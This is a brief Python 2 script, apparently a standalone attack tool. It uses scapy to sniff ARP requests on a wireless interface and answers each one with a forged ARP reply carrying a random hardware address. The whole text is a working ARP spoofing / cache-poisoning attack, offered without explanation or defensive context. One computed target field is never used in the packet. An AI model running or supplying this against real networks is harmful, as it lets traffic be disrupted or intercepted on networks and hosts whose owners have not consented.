from scapy.all import *
conf.iface = "wlan0"
def parse(pkt):
	if pkt.op != 2:
		print "[+]Who has ",pkt.pdst,"from",pkt.psrc," : ",
		op=2
		pdst=pkt.psrc
		psrc=pkt.pdst
		hwsrc=str(RandMAC())
		dst=pkt.src
		arp=(Ether(dst=dst,src="78:e4:00:70:ae:86")/ARP(op=op,psrc=psrc,hwdst=dst,hwsrc=hwsrc))
		sendp(arp,verbose=0)
		print "Replied"

sniff(prn=parse,filter="arp")


